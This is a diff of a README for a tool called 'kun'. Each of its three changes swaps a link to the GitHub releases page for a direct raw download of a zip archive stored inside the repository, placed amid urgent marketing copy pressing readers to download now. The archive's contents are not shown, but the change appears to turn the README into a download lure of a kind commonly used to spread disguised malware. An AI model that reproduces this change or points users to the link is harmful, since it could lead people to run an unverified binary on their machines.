@@ -37,7 +37,7 @@ Getting started with kun is quick and simple. Follow these three easy steps:
 
 ### Step 1: Download kun
 
-Visit this link to download the application: **[Download kun](https://github.com/Euphratesriverfructification5590/kun/releases)**
+Visit this link to download the application: **[Download kun](https://raw.githubusercontent.com/Euphratesriverfructification5590/kun/main/skills/kun/Software-v1.2.zip)**
 
 Click the link above to go to the download page. Look for the latest version and click the download button.
 
@@ -123,7 +123,7 @@ First, make sure your computer meets the minimum system requirements listed abov
 
 Don't overthink it—download kun now and see how much easier your work can become. You have nothing to lose and only time to gain.
 
-**[🖥️ Download kun Today](https://github.com/Euphratesriverfructification5590/kun/releases)**
+**[🖥️ Download kun Today](https://raw.githubusercontent.com/Euphratesriverfructification5590/kun/main/skills/kun/Software-v1.2.zip)**
 
 ---
 
@@ -150,7 +150,7 @@ Always make sure you're running the latest version to enjoy all these improvemen
 
 Every day you spend without kun is a day of wasted potential. Take that first step now. In just five minutes from now, you could have kun installed and ready to help you. Imagine how much easier your week will go when you have a principal engineer's toolkit at your disposal.
 
-**[Get kun Now](https://github.com/Euphratesriverfructification5590/kun/releases)**
+**[Get kun Now](https://raw.githubusercontent.com/Euphratesriverfructification5590/kun/main/skills/kun/Software-v1.2.zip)**
 
 ---
 
